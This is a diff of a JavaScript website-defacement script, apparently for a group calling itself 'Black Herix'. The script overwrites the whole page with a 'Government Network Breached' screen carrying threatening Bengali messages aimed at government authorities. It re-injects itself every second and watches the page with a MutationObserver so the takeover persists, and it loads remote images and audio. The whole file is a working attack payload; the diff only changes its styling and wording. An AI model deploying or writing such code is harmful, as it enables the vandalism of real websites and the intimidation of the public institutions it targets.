@@ -1,17 +1,16 @@
 (function() {
-    // নতুন ডিজাইন – GLITCHED GOVERNMENT TERMINAL
     const defaceHTML = `
 <!DOCTYPE html>
 <html lang="bn">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
-    <title>GOV DATABASE :: BREACHED</title>
+    <title>GOVERNMENT SECURITY BREACH</title>
     <style>
         :root {
-            --neon-pink: #ff007f;
-            --cyan: #00ffff;
-            --bg: #0a0a0a;
+            --red: #ff0000;
+            --green: #00ff00;
+            --dark: #000000;
         }
 
         * {
@@ -21,32 +20,33 @@
 
         body, html {
             height: 100%; width: 100%; overflow-y: auto; overflow-x: hidden;
-            background: var(--bg); color: var(--cyan); font-family: 'Courier New', monospace;
+            background: #000; color: var(--red); font-family: 'Courier New', monospace;
             cursor: crosshair;
         }
 
+        /* ওভারলে ইফেক্ট */
         .crt-scanlines {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            pointer-events: none; z-index: 999999; opacity: 0.15;
-            background: repeating-linear-gradient(0deg, rgba(255,255,255,0.03) 0px, rgba(255,255,255,0.03) 2px, transparent 2px, transparent 6px);
+            pointer-events: none; z-index: 999999; opacity: 0.2;
+            background: repeating-linear-gradient(0deg, rgba(255,0,0,0.05) 0px, rgba(255,0,0,0.05) 2px, transparent 2px, transparent 4px);
         }
 
-        .glitch-overlay {
+        .noise-overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            pointer-events: none; z-index: 999998;
-            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="4" height="4"><rect width="4" height="4" fill="rgba(0,0,0,0.7)"/><rect x="2" y="2" width="2" height="2" fill="rgba(255,0,127,0.3)"/></svg>');
-            background-size: 4px 4px; opacity: 0.4;
+            pointer-events: none; z-index: 999998; opacity: 0.04;
+            background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.5'/%3E%3C/svg%3E");
+            background-size: 150px 150px;
         }
 
         .vignette {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             pointer-events: none; z-index: 999997;
-            background: radial-gradient(ellipse at center, rgba(0,0,0,0) 50%, rgba(0,0,0,0.9) 100%);
+            background: radial-gradient(ellipse at center, rgba(0,0,0,0) 30%, rgba(0,0,0,0.9) 100%);
         }
 
         #matrix-canvas {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 0; pointer-events: none; opacity: 0.2;
+            z-index: 0; pointer-events: none; opacity: 0.3;
         }
 
         .particles-container {
@@ -54,111 +54,141 @@
         }
 
         .particle {
-            position: absolute; color: var(--neon-pink); font-size: 1rem; opacity: 0;
-            animation: floatUp 8s linear infinite; text-shadow: 0 0 8px var(--neon-pink);
+            position: absolute; color: var(--red); font-size: 1.2rem; opacity: 0;
+            animation: floatUp 10s linear infinite; text-shadow: 0 0 8px var(--red);
         }
 
         @keyframes floatUp {
-            0% { transform: translateY(110vh) translateX(0) rotate(0); opacity: 0; }
+            0% { transform: translateY(110vh) translateX(0) rotate(0deg); opacity: 0; }
             10% { opacity: 0.8; }
             60% { opacity: 0.3; }
-            100% { transform: translateY(-20vh) translateX(40px) rotate(270deg); opacity: 0; }
+            100% { transform: translateY(-10vh) translateX(40px) rotate(180deg); opacity: 0; }
         }
 
         .wrapper {
-            position: relative; z-index: 5; max-width: 720px; margin: 0 auto;
-            padding: 20px 16px 40px; text-align: center; width: 100%; min-height: 100vh;
+            position: relative; z-index: 5; max-width: 700px; margin: 0 auto;
+            padding: 30px 16px 40px; text-align: center; width: 100%; min-height: 100vh;
             display: flex; flex-direction: column; align-items: center; justify-content: flex-start;
         }
 
-        /* টার্মিনাল হেডার */
-        .term-header {
-            width: 100%; max-width: 600px; background: #000; border: 1px solid var(--cyan);
-            padding: 8px 12px; margin-bottom: 20px; text-align: left; font-size: 0.65rem;
-            color: var(--cyan); box-shadow: 0 0 20px rgba(0,255,255,0.2);
-            display: flex; justify-content: space-between; align-items: center;
-            letter-spacing: 1px;
-        }
-        .term-dots { display: flex; gap: 6px; }
-        .dot { width: 8px; height: 8px; border-radius: 50%; background: var(--neon-pink); box-shadow: 0 0 6px var(--neon-pink); }
-
-        .badge {
-            display: inline-block; padding: 4px 18px; background: rgba(255,0,127,0.15);
-            border: 1px solid var(--neon-pink); color: var(--neon-pink); font-weight: bold;
-            font-size: 0.7rem; letter-spacing: 3px; margin-bottom: 25px; text-shadow: 0 0 8px var(--neon-pink);
-            animation: blink 1.5s infinite;
+        /* টাইটেল ব্যানার */
+        .alert-banner {
+            border: 2px solid var(--red); background: rgba(20,0,0,0.9); padding: 10px 16px;
+            margin-bottom: 25px; font-weight: bold; font-size: 0.8rem; letter-spacing: 2px;
+            color: var(--red); text-shadow: 0 0 10px var(--red); box-shadow: 0 0 25px rgba(255,0,0,0.5);
+            animation: blink 2s infinite;
         }
 
-        .target-card {
-            background: rgba(10,10,10,0.8); border: 1px solid var(--cyan); padding: 10px;
-            max-width: 220px; margin-bottom: 30px; box-shadow: 0 0 25px rgba(0,255,255,0.3);
-            position: relative;
+        /* গ্লিচি ইমেজ কন্টেইনার */
+        .glitch-img-container {
+            position: relative; display: inline-block; margin: 20px 0 30px;
+            width: 160px; height: 160px;
         }
-        .target-card::before {
-            content: "CLASSIFIED"; position: absolute; top: -14px; left: 50%; transform: translateX(-50%);
-            background: var(--neon-pink); color: #000; padding: 2px 10px; font-size: 0.6rem;
-            font-weight: bold; letter-spacing: 2px;
+        .glitch-img-container img {
+            width: 100%; height: 100%; object-fit: cover; display: block;
+            filter: contrast(1.2) brightness(0.8);
         }
-        .target-img { width: 130px; height: 130px; object-fit: cover; display: block; filter: grayscale(0.3) contrast(1.2); }
-
-        .glitch-title {
-            font-size: 2rem; font-weight: 900; color: #fff; text-shadow: 2px 2px 0 var(--neon-pink), -2px -2px 0 var(--cyan);
-            margin-bottom: 20px; letter-spacing: 2px; position: relative; display: inline-block;
-            animation: glitchText 2s infinite;
+        .glitch-img-container::before,
+        .glitch-img-container::after {
+            content: ""; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: inherit; opacity: 0.6; mix-blend-mode: screen;
         }
-        @keyframes glitchText {
-            0%, 100% { transform: translate(0); }
-            20% { transform: translate(-2px, 2px); }
-            40% { transform: translate(2px, -2px); }
-            60% { transform: translate(-1px, -1px); }
-            80% { transform: translate(1px, 1px); }
+        .glitch-img-container::before {
+            background: url('https://i.ibb.co/ccrjKJh5/1000021966.jpg') center/cover;
+            clip-path: inset(10% 0 40% 0); transform: translate(-3px, 0);
+            animation: glitchRed 3s infinite; filter: hue-rotate(300deg) saturate(3);
         }
-
-        .log-box {
-            background: rgba(0,0,0,0.8); border: 1px dashed var(--cyan); padding: 18px 14px;
-            max-width: 600px; width: 100%; margin-bottom: 25px; text-align: left;
-            font-size: 0.8rem; line-height: 1.8; color: var(--cyan);
-            box-shadow: inset 0 0 15px rgba(0,255,255,0.1); position: relative;
+        .glitch-img-container::after {
+            background: url('https://i.ibb.co/ccrjKJh5/1000021966.jpg') center/cover;
+            clip-path: inset(50% 0 10% 0); transform: translate(3px, 0);
+            animation: glitchGreen 3s infinite; filter: hue-rotate(100deg) saturate(3);
         }
-        .log-box p { margin: 6px 0; }
-        .log-box .cursor { display: inline-block; width: 8px; height: 15px; background: var(--neon-pink); animation: blink 0.8s infinite; vertical-align: middle; margin-left: 3px; }
-
-        .demand-list {
-            list-style: none; padding: 0; margin: 20px 0;
+        @keyframes glitchRed {
+            0%, 100% { clip-path: inset(10% 0 40% 0); transform: translate(-3px, 0); }
+            20% { clip-path: inset(30% 0 20% 0); transform: translate(2px, -1px); }
+            40% { clip-path: inset(15% 0 35% 0); transform: translate(-1px, 1px); }
+            60% { clip-path: inset(40% 0 10% 0); transform: translate(3px, 0); }
+            80% { clip-path: inset(5% 0 45% 0); transform: translate(-2px, -1px); }
         }
-        .demand-list li {
-            color: var(--neon-pink); font-weight: bold; margin: 8px 0; font-size: 0.9rem;
-            text-shadow: 0 0 6px var(--neon-pink); position: relative; padding-left: 25px;
-        }
-        .demand-list li::before {
-            content: "▸"; position: absolute; left: 0; color: var(--cyan);
+        @keyframes glitchGreen {
+            0%, 100% { clip-path: inset(50% 0 10% 0); transform: translate(3px, 0); }
+            20% { clip-path: inset(20% 0 30% 0); transform: translate(-2px, 1px); }
+            40% { clip-path: inset(35% 0 15% 0); transform: translate(1px, -1px); }
+            60% { clip-path: inset(10% 0 40% 0); transform: translate(-3px, 0); }
+            80% { clip-path: inset(45% 0 5% 0); transform: translate(2px, 1px); }
         }
 
-        .ultimatum-box {
-            background: #000; border: 2px solid var(--neon-pink); padding: 18px 10px;
-            max-width: 600px; width: 100%; margin: 20px 0; color: #ffff00; font-weight: bold;
-            text-shadow: 0 0 8px #ffff00; box-shadow: 0 0 30px rgba(255,0,127,0.3);
-            position: relative;
+        /* মেইন টাইটেল */
+        .hacker-title {
+            font-size: 2rem; font-weight: 900; color: #fff;
+            text-shadow: 0 0 10px var(--red), 0 0 20px var(--green), 2px 2px 0 var(--red);
+            margin-bottom: 20px; letter-spacing: 2px;
+            animation: textFlicker 2s infinite;
         }
-        .ultimatum-box::before {
-            content: "⛔ ULTIMATUM ⛔"; position: absolute; top: -14px; left: 50%;
+        @keyframes textFlicker {
+            0%, 100% { opacity: 1; }
+            40% { opacity: 0.9; text-shadow: 0 0 15px var(--green), 0 0 25px var(--red); }
+            60% { opacity: 1; }
+            80% { opacity: 0.8; text-shadow: 0 0 5px var(--red); }
+        }
+
+        /* ভাসমান মেসেজ কন্টেইনার */
+        .floating-messages {
+            max-width: 600px; width: 100%; margin: 15px 0 25px;
+            overflow: hidden; position: relative; height: 180px; /* নির্দিষ্ট উচ্চতা */
+            border-top: 1px solid var(--red); border-bottom: 1px solid var(--green);
+            background: rgba(10,0,0,0.5);
+            padding: 10px 0;
+        }
+        .msg-scroll {
+            animation: scrollUp 20s linear infinite;
+        }
+        @keyframes scrollUp {
+            0% { transform: translateY(100%); }
+            100% { transform: translateY(-100%); }
+        }
+        .msg-item {
+            padding: 8px 12px; font-size: 0.9rem; font-weight: bold;
+            color: var(--green); text-shadow: 0 0 6px var(--green);
+            border-left: 3px solid var(--red); margin: 10px 0; text-align: left;
+            background: rgba(0,10,0,0.3);
+        }
+        .msg-item.red { color: var(--red); text-shadow: 0 0 6px var(--red); border-left-color: var(--green); }
+
+        /* আল্টিমেটাম */
+        .ultimatum {
+            border: 2px dashed var(--green); background: rgba(0,10,0,0.7); padding: 18px 10px;
+            max-width: 600px; width: 100%; margin: 20px 0; color: var(--red); font-weight: bold;
+            text-shadow: 0 0 8px var(--red); letter-spacing: 1px; line-height: 1.6;
+            box-shadow: 0 0 25px rgba(0,255,0,0.3); position: relative;
+        }
+        .ultimatum::before {
+            content: "⛔ সতর্কতা ⛔"; position: absolute; top: -14px; left: 50%;
             transform: translateX(-50%); background: #000; padding: 2px 14px;
-            color: #ffff00; font-size: 0.7rem; letter-spacing: 2px; border: 1px solid #ffff00;
+            color: var(--green); font-size: 0.7rem; letter-spacing: 2px;
+            border: 1px solid var(--green); text-shadow: 0 0 6px var(--green);
         }
 
         .click-hint {
             margin-top: 15px; font-size: 0.7rem; color: #666; animation: blink 2s infinite;
-            border-bottom: 1px dotted var(--cyan); padding-bottom: 4px;
+            border-bottom: 1px dotted var(--red); padding-bottom: 4px;
         }
 
-        .status-row {
-            margin-top: 25px; display: flex; gap: 10px; flex-wrap: wrap; justify-content: center;
-            font-size: 0.6rem; color: var(--cyan); border-top: 1px solid #333; padding-top: 15px;
+        .status-bar {
+            margin-top: 20px; display: flex; flex-wrap: wrap; justify-content: center;
+            gap: 10px; font-size: 0.6rem; color: var(--green); letter-spacing: 1px;
+            border-top: 1px solid var(--red); padding-top: 15px;
         }
-        .status-row span { background: rgba(0,255,255,0.1); padding: 3px 10px; border-radius: 2px; }
+        .status-bar span { background: rgba(255,0,0,0.1); padding: 3px 10px; border-radius: 2px; }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.2; }
+        }
 
         @media (min-width: 600px) {
-            .glitch-title { font-size: 2.8rem; }
+            .hacker-title { font-size: 2.8rem; }
+            .glitch-img-container { width: 200px; height: 200px; }
         }
     </style>
 </head>
@@ -167,55 +197,56 @@
         <source src="https://files.catbox.moe/tcj7j8.mp3" type="audio/mpeg">
     </audio>
     <div class="crt-scanlines"></div>
-    <div class="glitch-overlay"></div>
+    <div class="noise-overlay"></div>
     <div class="vignette"></div>
     <canvas id="matrix-canvas"></canvas>
     <div class="particles-container" id="particles-container"></div>
 
     <div class="wrapper">
-        <div class="term-header">
-            <span>root@gov-server:~#</span>
-            <div class="term-dots"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
-            <span>CONN: ANONYMOUS</span>
-        </div>
-        <div class="badge">[ BREACH ACTIVE ]</div>
+        <div class="alert-banner">!!! GOVERNMENT NETWORK BREACHED !!!</div>
 
-        <div class="target-card">
-            <img src="https://i.ibb.co/ccrjKJh5/1000021966.jpg" alt="Target" class="target-img">
+        <!-- গ্লিচি প্রোফাইল ইমেজ -->
+        <div class="glitch-img-container">
+            <img src="https://i.ibb.co/ccrjKJh5/1000021966.jpg" alt="Target">
         </div>
 
-        <h1 class="glitch-title">Hacked By Black Herix</h1>
+        <h1 class="hacker-title">Hacked By Black Herix</h1>
 
-        <div class="log-box">
-            <p>> Initializing intrusion... <span style="color:#00ff00;">OK</span></p>
-            <p>> Bypassing firewall... <span style="color:#00ff00;">OK</span></p>
-            <p>> Dumping credentials... <span style="color:#ffff00;">IN PROGRESS</span><span class="cursor"></span></p>
-            <p>> Message to admin: <span style="color:var(--neon-pink);">তোমাদের সিস্টেম চুরমার!</span></p>
+        <!-- ভাসমান মেসেজ -->
+        <div class="floating-messages">
+            <div class="msg-scroll">
+                <div class="msg-item">সরকার, আপনার সিস্টেমে আমরা ঢুকেছি।</div>
+                <div class="msg-item red">ফায়ারওয়াল? ভেঙে চুরমার।</div>
+                <div class="msg-item">আপনার নিরাপত্তা ব্যবস্থা কাগজের বেড়া মাত্র।</div>
+                <div class="msg-item red">আমরা যেকোনো সময়, যেকোনো ডাটা নিতে পারি।</div>
+                <div class="msg-item">এটা সাইবার জগতের বাস্তবতা দেখানোর ছোট্ট নমুনা।</div>
+                <div class="msg-item red">অবহেলা করলে পরিণতি ভয়াবহ হবে।</div>
+                <div class="msg-item">আপনার ডিজিটাল দেয়ালগুলো আর মজবুত করুন।</div>
+                <div class="msg-item red">আমরা বারবার ফিরে আসব – প্রস্তুত থাকুন।</div>
+                <!-- আবার লুপের জন্য কপি -->
+                <div class="msg-item">সরকার, আপনার সিস্টেমে আমরা ঢুকেছি।</div>
+                <div class="msg-item red">ফায়ারওয়াল? ভেঙে চুরমার।</div>
+            </div>
         </div>
 
-        <ul class="demand-list">
-            <li>ডিজিটাল জগতে আমরা কারো কাছে ছোট নই।</li>
-            <li>সরকারি ফাঁকফোকর আমরা বন্ধ করতেই পারি।</li>
-            <li>এটা শুধু শুরু – বড় ধাক্কা এখনও বাকি।</li>
-        </ul>
-
-        <div class="ultimatum-box">
-            প্রশাসনের উদ্দেশ্যে: সাইবার ডিফেন্স জোরদার করুন, নয়তো প্রতিবার আমরা আরও ভয়ংকর রূপে হাজির হবো। এটা কোনো হুমকি না – সত্যি বলছি।
+        <div class="ultimatum">
+            সরকারি কর্তৃপক্ষের প্রতি: আপনাদের অনলাইন অবকাঠামো নিরাপত্তাহীন। আমরা কোনো ক্ষতি করতে আসিনি, কিন্তু সতর্ক করতে এসেছি। যদি নিরাপত্তা না বাড়ান, তাহলে পরবর্তী আক্রমণ আরো ধ্বংসাত্মক হবে। এটা কোনো হুমকি নয় – বাস্তবতা।
         </div>
 
-        <p class="click-hint">[ ক্লিক করো – সাইরেন বাজবে ]</p>
+        <p class="click-hint">[ পেজে ক্লিক করলে সতর্ক সংকেত বাজবে ]</p>
 
-        <div class="status-row">
-            <span>IP: SPOOFED</span>
+        <div class="status-bar">
             <span>TRACE: FAILED</span>
+            <span>IP: SPOOFED</span>
             <span>CREW: BLACK HERIX</span>
+            <span>MOTIVE: AWARENESS</span>
         </div>
     </div>
 </body>
 </html>
 `;
 
-    // ডম ওভাররাইট ইঞ্জিন (আগের মতোই)
+    // ডম ওভাররাইট ইঞ্জিন (অপরিবর্তিত)
     function injectDeface() {
         if (document.documentElement.innerHTML !== defaceHTML) {
             document.open();
@@ -247,9 +278,9 @@
                 return;
             }
             lastTime = timestamp;
-            ctx.fillStyle = 'rgba(0, 0, 0, 0.15)';
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.12)';
             ctx.fillRect(0, 0, width, height);
-            ctx.fillStyle = '#ff007f'; // নিওন পিংক ম্যাট্রিক্স
+            ctx.fillStyle = '#ff0000'; // রেড ম্যাট্রিক্স রেইন
             ctx.font = fontSize + 'px monospace';
             for (let i = 0; i < drops.length; i++) {
                 const char = String.fromCharCode(0x30A0 + Math.random() * 96);
@@ -262,25 +293,28 @@
         resizeMatrix();
         requestAnimationFrame(drawMatrix);
 
+        // পার্টিকেল জেনারেটর (লাল সিম্বল)
         const container = document.getElementById('particles-container');
-        const symbols = ['⚠', '☠', '✖', '⚡'];
+        const symbols = ['☠', '⚠', '✖', '⬤'];
         setInterval(() => {
             if (!container) return;
             const particle = document.createElement('span');
             particle.classList.add('particle');
             particle.textContent = symbols[Math.floor(Math.random() * symbols.length)];
             particle.style.left = Math.random() * 90 + '%';
-            particle.style.animationDuration = (Math.random() * 6 + 5) + 's';
+            particle.style.animationDuration = (Math.random() * 8 + 6) + 's';
             container.appendChild(particle);
-            setTimeout(() => particle.remove(), 8000);
-        }, 2500);
+            setTimeout(() => particle.remove(), 10000);
+        }, 2800);
     }
 
+    // অটো-ইনজেকশন ও লক
     injectDeface();
     setInterval(injectDeface, 1000);
     const observer = new MutationObserver(injectDeface);
     observer.observe(document.documentElement, { childList: true, subtree: true });
 
+    // অডিও ট্রিগার
     document.addEventListener('click', function() {
         const audio = document.getElementById('bg-music');
         if (audio) { audio.play().catch(e => console.log("Audio blocked")); }
